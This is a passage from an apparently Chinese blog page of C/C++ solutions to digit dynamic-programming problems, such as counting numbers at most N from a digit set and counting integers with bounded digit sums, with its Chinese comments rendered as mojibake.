&gt;&gt; <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// è¿”å›åˆæ³•è§£çš„æ•°é‡</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">15</span>;  <span class="hljs-comment">// è®¾ç½®çš‡åçš„æ•°é‡</span><br><br>    <span class="hljs-comment">// æµ‹è¯•æ–¹æ³• 2</span><br>    <span class="hljs-type">long</span> start = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; num2(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-type">long</span> end = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Method 2 cost time: &quot;</span> &lt;&lt; (end - start) * <span class="hljs-number">1000.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="hljs-string">&quot;ms&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-comment">// æµ‹è¯•æ–¹æ³• 1</span><br>    start = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; num1(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    end = clock();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Method 1 cost time: &quot;</span> &lt;&lt; (end - start) * <span class="hljs-number">1000.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="hljs-string">&quot;ms&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æœ€å¤§ä¸ºNçš„æ•°å­—ç»„åˆ"><a href="#æœ€å¤§ä¸ºNçš„æ•°å­—ç»„åˆ" class="headerlink" title="æœ€å¤§ä¸ºNçš„æ•°å­—ç»„åˆ"></a>æœ€å¤§ä¸ºNçš„æ•°å­—ç»„åˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æœ€å¤§ä¸ºNçš„æ•°å­—ç»„åˆ</span><br><span class="hljs-comment">// ç»™å®šä¸€ä¸ªæŒ‰ éé€’å‡é¡ºåº æ’åˆ—çš„æ•°å­—æ•°ç»„ digits</span><br><span class="hljs-comment">// å·²çŸ¥digitsä¸€å®šä¸åŒ…å«&#x27;0&#x27;ï¼Œå¯èƒ½åŒ…å«&#x27;1&#x27; ~ &#x27;9&#x27;ï¼Œä¸”æ— é‡å¤å­—ç¬¦</span><br><span class="hljs-comment">// ä½ å¯ä»¥ç”¨ä»»æ„æ¬¡æ•° digits[i] æ¥å†™çš„æ•°å­—</span><br><span class="hljs-comment">// ä¾‹å¦‚ï¼Œå¦‚æœ digits = [&#x27;1&#x27;,&#x27;3&#x27;,&#x27;5&#x27;]</span><br><span class="hljs-comment">// æˆ‘ä»¬å¯ä»¥å†™æ•°å­—ï¼Œå¦‚ &#x27;13&#x27;, &#x27;551&#x27;, å’Œ &#x27;1351315&#x27;</span><br><span class="hljs-comment">// è¿”å› å¯ä»¥ç”Ÿæˆçš„å°äºæˆ–ç­‰äºç»™å®šæ•´æ•° n çš„æ­£æ•´æ•°çš„ä¸ªæ•°</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">// offsetæ˜¯è¾…åŠ©å˜é‡ï¼Œå®Œå…¨ç”±lenå†³å®šï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿æå–numä¸­æŸä¸€ä½æ•°å­—ï¼Œä¸æ˜¯å…³é”®å˜é‡</span><br><span class="hljs-comment">// è¿˜å‰©ä¸‹lenä½æ²¡æœ‰å†³å®š</span><br><span class="hljs-comment">// å¦‚æœä¹‹å‰çš„ä½å·²ç»ç¡®å®šæ¯”numå°ï¼Œé‚£ä¹ˆfree == 1ï¼Œè¡¨ç¤ºæ¥ä¸‹çš„æ•°å­—å¯ä»¥è‡ªç”±é€‰æ‹©</span><br><span class="hljs-comment">// å¦‚æœä¹‹å‰çš„ä½å’Œnumä¸€æ ·ï¼Œé‚£ä¹ˆfree == 0ï¼Œè¡¨ç¤ºæ¥ä¸‹çš„æ•°å­—ä¸èƒ½å¤§äºnumå½“å‰ä½çš„æ•°å­—</span><br><span class="hljs-comment">// å¦‚æœä¹‹å‰çš„ä½æ²¡æœ‰ä½¿ç”¨è¿‡æ•°å­—ï¼Œfix == 0</span><br><span class="hljs-comment">// å¦‚æœä¹‹å‰çš„ä½å·²ç»ä½¿ç”¨è¿‡æ•°å­—ï¼Œfix == 1</span><br><span class="hljs-comment">// è¿”å›æœ€ç»ˆ&lt;=numçš„å¯èƒ½æ€§æœ‰å¤šå°‘ç§</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; digits, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>, <span class="hljs-type">int</span> fix)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> fix == <span class="hljs-number">1</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// numåœ¨å½“å‰ä½çš„æ•°å­—</span><br>    <span class="hljs-type">int</span> cur = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (fix == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ä¹‹å‰ä»æ¥æ²¡æœ‰é€‰æ‹©è¿‡æ•°å­—</span><br>        <span class="hljs-comment">// å½“å‰ä¾ç„¶å¯ä»¥ä¸è¦ä»»ä½•æ•°å­—ï¼Œç´¯åŠ åç»­çš„å¯èƒ½æ€§</span><br>        ans += f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ä¸èƒ½è‡ªç”±é€‰æ‹©çš„æƒ…å†µ</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : digits) &#123;<br>            <span class="hljs-keyword">if</span> (i &lt; cur) &#123;<br>                ans += f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == cur) &#123;<br>                ans += f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// i &gt; cur</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¯ä»¥è‡ªç”±é€‰æ‹©çš„æƒ…å†µ</span><br>        ans += digits.size() * f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">atMostNGivenDigitSet1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; strs, <span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-type">int</span> tmp = num / <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        tmp /= <span class="hljs-number">10</span>;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> m = strs.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">digits</span><span class="hljs-params">(m)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        digits[i] = stoi(strs[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> f1(digits, num, offset, len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; digits, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// numè‡ªå·±</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// curæ˜¯numå½“å‰ä½çš„æ•°å­—</span><br>    <span class="hljs-type">int</span> cur = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : digits) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; cur) &#123;<br>            ans += cnt[len - <span class="hljs-number">1</span>];<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == cur) &#123;<br>            ans += f2(digits, cnt, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">atMostNGivenDigitSet2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; strs, <span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-type">int</span> m = strs.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">digits</span><span class="hljs-params">(m)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        digits[i] = stoi(strs[i]);<br>    &#125;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = num / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        tmp /= <span class="hljs-number">10</span>;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-comment">// cnt[i] : å·²çŸ¥å‰ç¼€æ¯”numå°ï¼Œå‰©ä¸‹iä½æ²¡æœ‰ç¡®å®šï¼Œè¯·é—®å‰ç¼€ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œä¸€å…±æœ‰å¤šå°‘ç§æ•°å­—æ’åˆ—</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(len)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m, k = <span class="hljs-number">1</span>; k &lt; len; k++, i *= m) &#123;<br>        cnt[k] = i;<br>        ans += i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans + f2(digits, cnt, num, offset, len);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt; strs = &#123;<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>&#125;;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from atMostNGivenDigitSet1: &quot;</span> &lt;&lt; atMostNGivenDigitSet1(strs, num) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from atMostNGivenDigitSet2: &quot;</span> &lt;&lt; atMostNGivenDigitSet2(strs, num) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ç»Ÿè®¡æ•´æ•°æ•°ç›®"><a href="#ç»Ÿè®¡æ•´æ•°æ•°ç›®" class="headerlink" title="ç»Ÿè®¡æ•´æ•°æ•°ç›®"></a>ç»Ÿè®¡æ•´æ•°æ•°ç›®</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ç»Ÿè®¡æ•´æ•°æ•°ç›®</span><br><span class="hljs-comment">// ç»™ä½ ä¸¤ä¸ªæ•°å­—å­—ç¬¦ä¸² num1 å’Œ num2 ï¼Œä»¥åŠä¸¤ä¸ªæ•´æ•°max_sumå’Œmin_sum</span><br><span class="hljs-comment">// å¦‚æœä¸€ä¸ªæ•´æ•° x æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œæˆ‘ä»¬ç§°å®ƒæ˜¯ä¸€ä¸ªå¥½æ•´æ•°</span><br><span class="hljs-comment">// num1 &lt;= x &lt;= num2</span><br><span class="hljs-comment">// min_sum &lt;= digit_sum(x) &lt;= max_sum</span><br><span class="hljs-comment">// è¯·ä½ è¿”å›å¥½æ•´æ•°çš„æ•°ç›®</span><br><span class="hljs-comment">// ç­”æ¡ˆå¯èƒ½å¾ˆå¤§ï¼Œç­”æ¡ˆå¯¹ 1000000007 å–æ¨¡</span><br><span class="hljs-comment">// æ³¨æ„ï¼Œdigit_sum(x)è¡¨ç¤ºxå„ä½æ•°å­—ä¹‹å’Œ</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">23</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXM = <span class="hljs-number">401</span>;<br><br><span class="hljs-type">int</span> dp[MAXN][MAXM][<span class="hljs-number">2</span>];<br><br><span class="hljs-type">char</span> num[MAXN];<br><span class="hljs-type">int</span> min_sum, max_sum, len;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= max_sum; j++) &#123;<br>            dp[i][j][<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>            dp[i][j][<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// æ³¨æ„ï¼š</span><br><span class="hljs-comment">// æ•°å­—ï¼Œchar[] num</span><br><span class="hljs-comment">// æ•°å­—é•¿åº¦ï¼Œint len</span><br><span class="hljs-comment">// ç´¯åŠ å’Œæœ€å°è¦æ±‚ï¼Œint min</span><br><span class="hljs-comment">// ç´¯åŠ å’Œæœ€å¤§è¦æ±‚ï¼Œint max</span><br><span class="hljs-comment">// è¿™å››ä¸ªå˜é‡éƒ½æ˜¯å…¨å±€é™æ€å˜é‡ï¼Œæ‰€ä»¥ä¸ç”¨å¸¦å‚æ•°ï¼Œç›´æ¥è®¿é—®å³å¯</span><br><span class="hljs-comment">// é€’å½’å«ä¹‰ï¼š</span><br><span class="hljs-comment">// ä»numçš„é«˜ä½å‡ºå‘ï¼Œå½“å‰æ¥åˆ°iä½ä¸Š</span><br><span class="hljs-comment">// ä¹‹å‰å†³å®šçš„æ•°å­—ç´¯åŠ å’Œæ˜¯sum</span><br><span class="hljs-comment">// ä¹‹å‰çš„å†³å®šå·²ç»æ¯”numå°ï¼Œåç»­å¯ä»¥è‡ªç”±é€‰æ‹©æ•°å­—ï¼Œé‚£ä¹ˆfree == 1</span><br><span class="hljs-comment">// ä¹‹å‰çš„å†³å®šå’Œnumä¸€æ ·ï¼Œåç»­ä¸å¯ä»¥è‡ªç”±é€‰æ‹©æ•°å­—ï¼Œé‚£ä¹ˆfree == 0</span><br><span class="hljs-comment">// è¿”å›æœ‰å¤šå°‘ç§å¯èƒ½æ€§</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> sum, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (sum &gt; max_sum) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (sum + (len - i) * <span class="hljs-number">9</span> &lt; min_sum) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (i == len) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[i][sum][<span class="hljs-built_in">free</span>] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[i][sum][<span class="hljs-built_in">free</span>];<br>    &#125;<br><br>    <span class="hljs-type">int</span> cur = num[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// è¿˜ä¸èƒ½è‡ªç”±é€‰æ‹©</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> pick = <span class="hljs-number">0</span>; pick &lt; cur; pick++) &#123;<br>            ans = (ans + f(i + <span class="hljs-number">1</span>, sum + pick, <span class="hljs-number">1</span>)) % MOD;<br>        &#125;<br>        ans = (ans + f(i + <span class="hljs-number">1</span>, sum + cur, <span class="hljs-number">0</span>)) % MOD;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¯ä»¥è‡ªç”±é€‰æ‹©</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> pick = <span class="hljs-number">0</span>; pick &lt;= <span class="hljs-number">9</span>; pick++) &#123;<br>            ans = (ans + f(i + <span class="hljs-number">1</span>, sum + pick, <span class="hljs-number">1</span>)) % MOD;<br>        &#125;<br>    &#125;<br>    dp[i][sum][<span class="hljs-built_in">free</span>] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        sum += num[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum &gt;= min_sum &amp;&amp; sum &lt;= max_sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">count</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; num1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; num2, <span class="hljs-type">int</span> min_sum, <span class="hljs-type">int</span> max_sum)</span> &#123;<br>    ::min_sum = min_sum;<br>    ::max_sum = max_sum;<br>    <span class="hljs-built_in">strcpy</span>(num, num2.c_str());<br>    len = num2.length();<br>    build();<br>    <span class="hljs-type">int</span> ans = f(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-built_in">strcpy</span>(num, num1.c_str());<br>    len = num1.length();<br>    build();<br>    ans = (ans - f(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + MOD) % MOD;<br>    <br>    <span class="hljs-keyword">if</span> (check()) &#123;<br>        ans = (ans + <span class="hljs-number">1</span>) % MOD;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> num1 = <span class="hljs-string">&quot;100&quot;</span>;<br>    <span class="hljs-built_in">string</span> num2 = <span class="hljs-string">&quot;500&quot;</span>;<br>    <span class="hljs-type">int</span> min_sum = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> max_sum = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result: &quot;</span> &lt;&lt; count(num1, num2, min_sum, max_sum) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å®Œå…¨æ²¡æœ‰é‡å¤çš„æ•°å­—ä¸ªæ•°"><a href="#å®Œå…¨æ²¡æœ‰é‡å¤çš„æ•°å­—ä¸ªæ•°" class="headerlink" title="å®Œå…¨æ²¡æœ‰é‡å¤çš„æ•°å­—ä¸ªæ•°"></a>å®Œå…¨æ²¡æœ‰é‡å¤çš„æ•°å­—ä¸ªæ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 